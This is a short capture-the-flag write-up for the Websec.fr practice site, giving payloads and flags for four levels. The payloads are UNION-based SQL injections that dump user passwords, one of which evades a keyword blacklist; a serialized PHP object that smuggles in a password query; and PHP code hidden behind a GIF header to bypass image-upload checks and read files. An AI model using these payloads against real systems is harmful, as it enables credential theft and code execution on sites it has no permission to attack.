# Websec.fr-Writeups

## Level 1

```sql
0 union select id,password from users; --
```

```
WEBSEC{Simple_SQLite_Injection}
```

## Level 2

```sql
0 ununionion selselectect id,password frfromom users; --
```

```
WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
```

## Level 4

```php
$s = new SQL();
$s->SQL_query('select password as username from users;');
echo base64_encode(serialize(array("ip" => "109.186.77.58", "exploit" => $s)));

// a:2:{s:2:"ip";s:13:"109.186.77.58";s:7:"exploit";O:3:"SQL":2:{s:5:"query";s:39:"select password as username from users;";s:4:"conn";N;}}

// YToyOntzOjI6ImlwIjtzOjEzOiIxMDkuMTg2Ljc3LjU4IjtzOjc6ImV4cGxvaXQiO086MzoiU1FMIjoyOntzOjU6InF1ZXJ5IjtzOjM5OiJzZWxlY3QgcGFzc3dvcmQgYXMgdXNlcm5hbWUgZnJvbSB1c2VyczsiO3M6NDoiY29ubiI7Tjt9fQ==
```

```
WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```

## Level 8

PHP Injected in GIF

```php
GIF89a;

<?php
print_r(scandir("."));
?>
```

```php
GIF89a;

<?php
echo file_get_contents('flag.txt');
?>
```

```
WEBSEC{BypassingImageChecksToRCE}
```
